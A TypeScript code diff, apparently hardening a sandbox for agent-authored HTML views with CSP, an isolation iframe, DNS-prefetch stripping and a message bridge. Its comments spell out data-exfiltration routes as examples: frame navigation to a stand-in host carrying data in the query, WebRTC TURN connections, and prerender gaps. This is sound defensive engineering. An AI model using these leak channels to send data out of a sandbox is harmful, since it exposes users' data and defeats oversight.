@@ -18,6 +18,8 @@
 // CSP metas that slip through the strip can only add restrictions, never relax
 // ours — browsers enforce every CSP meta in the document.
 
+import { type DataQuerySpec, dataQuerySpecSchema } from '@maskin/shared'
+
 export const MINI_APP_CSP = [
 	"default-src 'none'",
 	"style-src 'unsafe-inline'",
@@ -162,6 +164,16 @@ export function stripMetaRefresh(html: string): string {
 	return html.replace(META_REFRESH_RE, '')
 }
 
+// Switches DNS prefetch off for a document. Chromium honours this meta and the host lookups it
+// stops are another way to carry data in a hostname. An agent-authored copy is removed first,
+// so a later "on" cannot undo ours.
+const DNS_PREFETCH_OFF_META = '<meta http-equiv="x-dns-prefetch-control" content="off">'
+const DNS_PREFETCH_META_RE =
+	/<meta\b[^>]*\bhttp-equiv\s*=\s*["']?x-dns-prefetch-control["']?[^>]*>/gi
+export function stripDnsPrefetchControl(html: string): string {
+	return html.replace(DNS_PREFETCH_META_RE, '')
+}
+
 // Platform footer for a mini-app document: platform CSP meta + data-slot
 // bootstrap. Scoped to the HTML render paths in the viewer — non-HTML file
 // types never touch this. Agent CSP metas are stripped first, then refresh
@@ -272,4 +284,116 @@ export function prepareViewerHtml(html: string, options?: { paged?: boolean }): 
 	const scrubbed = stripMetaRefresh(stripAgentCsp(html))
 	const paging = options?.paged ? VIEWER_PAGING_CONTROLLER : ''
 	return injectIntoHtml(scrubbed, CSP_META + DATA_SLOT_BOOTSTRAP + VIEWER_REPORTER + paging)
+}
+
+// ---------------------------------------------------------------------------
+// Data bridge for agent-built loop views (v2 of the seam named in the header).
+//
+// A view is an ordinary mini-app document under the SAME platform CSP
+// (connect-src 'none', null origin, no allow-same-origin) — none of that is
+// loosened. Data reaches it only by message: the frame asks the host through
+// window.maskin.query(name), the host answers from the viewer's own session,
+// and no credential ever enters the frame. The view declares what it may ask
+// for in <script id="maskin-sources" type="application/json">: a map of source
+// name to a query_data input. The host answers ONLY declared names.
+// ---------------------------------------------------------------------------
+
+export const SOURCES_SLOT_ID = 'maskin-sources'
+
+/** Frame -> host: { type, id: number, name: string }. */
+export const BRIDGE_QUERY_MESSAGE = 'maskin:bridge:query'
+/** Host -> frame: { type, id, data } or { type, id, error }. */
+export const BRIDGE_RESULT_MESSAGE = 'maskin:bridge:result'
+/** Host -> frame: fired every refresh tick; the frame re-emits it as a window "maskin:refresh" event. */
+export const BRIDGE_REFRESH_MESSAGE = 'maskin:bridge:refresh'
+
+// Same posting model as the viewer reporter above: null origin, so targetOrigin
+// is '*' and the host validates event.source against its own iframe instead.
+// The frame lives one frame deeper than the host (see the isolation frame below), so
+// the host is `parent.parent`; the frame only accepts results from it. Unlike VIEWER_REPORTER this
+// does not swallow wheel events: an inline view must let the page scroll.
+const BRIDGE_SCRIPT = `<script>(function(){var n=0,p={};window.maskin={query:function(name){return new Promise(function(res,rej){var id=++n;p[id]={res:res,rej:rej};parent.parent.postMessage({type:'${BRIDGE_QUERY_MESSAGE}',id:id,name:String(name)},'*')})}};window.addEventListener('message',function(e){if(e.source!==parent.parent)return;var d=e.data;if(!d)return;if(d.type==='${BRIDGE_RESULT_MESSAGE}'){var h=p[d.id];if(!h)return;delete p[d.id];if(d.error)h.rej(new Error(d.error));else h.res(d.data)}else if(d.type==='${BRIDGE_REFRESH_MESSAGE}'){window.dispatchEvent(new Event('maskin:refresh'))}})})();</script>`
+
+// Reports the document's content height (not scrollHeight, which can never
+// shrink below the frame's own height) on load, resize and every layout change,
+// so an inline view can size its iframe to fit as data arrives.
+const VIEW_SIZE_REPORTER = `<script>(function(){function s(){try{var d=document.documentElement;parent.parent.postMessage({type:'${VIEWER_DOC_SIZE_MESSAGE}',w:d.scrollWidth,cw:d.clientWidth,h:Math.ceil(Math.max(d.getBoundingClientRect().height,d.scrollHeight>window.innerHeight?d.scrollHeight:0))},'*')}catch(e){}}if(document.readyState==='complete')s();else window.addEventListener('load',s);window.addEventListener('resize',s);if(window.ResizeObserver)new ResizeObserver(s).observe(document.documentElement)})();</script>`
+
+// Inline-view variant of `prepareMiniAppHtml`: same CSP + data-slot bootstrap,
+// plus the size reporter and the bridge. One `injectIntoHtml` call, as above.
+export function prepareBridgedViewHtml(html: string): string {
+	const scrubbed = stripDnsPrefetchControl(stripMetaRefresh(stripAgentCsp(html)))
+	return injectIntoHtml(
+		scrubbed,
+		DNS_PREFETCH_OFF_META + CSP_META + DATA_SLOT_BOOTSTRAP + VIEW_SIZE_REPORTER + BRIDGE_SCRIPT,
+	)
+}
+
+// The isolation frame. A view's script can send what it has read anywhere by
+// navigating its own frame (`location = 'https://x/?d=' + data`); the platform CSP
+// does not cover navigation. A document's `frame-src` is checked against its child
+// frames' navigations, including a child navigating itself, so the view runs in a
+// frame INSIDE a frame whose only policy is `frame-src 'none'`. That outer frame
+// holds no agent code. It carries no other CSP on purpose: a srcdoc frame inherits
+// its embedder's policy, and `img-src data:` etc. must stay the view's own.
+//
+// This is one layer, not a seal. Verified in Chrome only; other browsers are
+// untested. What stays open (see loop-custom-view.spec.ts for what was measured):
+//   - WebRTC: `new RTCPeerConnection({iceServers:[{urls:'turn:host:port'}]})` opens a
+//     connection to a host of the view's choosing. No header, CSP rule, Permissions-Policy
+//     or sandbox flag closes it today, and deleting the constructor does not hold because a
+//     script can take a fresh one from an empty child frame. Safari and Firefox are open too.
+//   - prerender and preconnect: Chrome skips `default-src 'none'` for prerender (Broken
+//     Browser, 9 May 2026). Neither fires in headless Chrome, even from a top-level page, so
+//     we could not prove them closed from the null-origin frame.
+//   - Link and speculation-rules prefetch from the view never reached the test server in
+//     Chrome (static and script-created tags), so those have regression tests and no code.
+// The real close for all of these is to stop trusting the view's script (static HTML and
+// CSS, or a bridge that gates what the frame can read), which is a bet, not a patch.
+/** Isolation frame -> host: the view frame finished a load. A second one means it navigated. */
+export const ISOLATION_LOAD_MESSAGE = 'maskin:view:load'
+export const ISOLATION_FRAME_CSP = "frame-src 'none'"
+
+const escapeAttr = (s: string) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
+
+/** The document the host puts in its iframe: it holds the view (from `prepareBridgedViewHtml`) in a frame of its own. */
+export function prepareIsolatedViewHtml(html: string): string {
+	// The load relay is an attribute, not a script, so it is bound before the first load can fire.
+	return `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${ISOLATION_FRAME_CSP}"><style>html,body{margin:0;height:100%;overflow:hidden}iframe{display:block;border:0;width:100%;height:100%}</style></head><body><iframe scrolling="no" sandbox="allow-scripts" onload="parent.postMessage({type:'${ISOLATION_LOAD_MESSAGE}'},'*')" srcdoc="${escapeAttr(prepareBridgedViewHtml(html))}"></iframe></body></html>`
+}
+
+export type ViewSourcesResult =
+	| { ok: true; sources: Map<string, DataQuerySpec> }
+	| { ok: false; error: string }
+
+// Reads the declared sources out of a view document. DOMParser builds an inert
+// document (scripts never run), so this is safe on untrusted HTML. A missing
+// slot is a valid view with no data; malformed JSON or an invalid query is an
+// error the host shows as a fallback to the default page.
+export function readViewSources(html: string): ViewSourcesResult {
+	const slot = new DOMParser().parseFromString(html, 'text/html').getElementById(SOURCES_SLOT_ID)
+	if (!slot) return { ok: true, sources: new Map() }
+	let raw: unknown
+	try {
+		raw = JSON.parse(slot.textContent ?? '')
+	} catch {
+		return { ok: false, error: `The ${SOURCES_SLOT_ID} block is not valid JSON.` }
+	}
+	if (!raw || typeof raw !== 'object' || Array.isArray(raw)) {
+		return { ok: false, error: `The ${SOURCES_SLOT_ID} block must be a JSON object.` }
+	}
+	const sources = new Map<string, DataQuerySpec>()
+	for (const [name, value] of Object.entries(raw)) {
+		const parsed = dataQuerySpecSchema.safeParse(value)
+		if (!parsed.success) {
+			const issue = parsed.error.issues[0]
+			return {
+				ok: false,
+				error:
+					`Source "${name}" is not a valid query: ${issue?.path.join('.') || 'query'} ${issue?.message ?? ''}`.trim(),
+			}
+		}
+		sources.set(name, parsed.data)
+	}
+	return { ok: true, sources }
 }
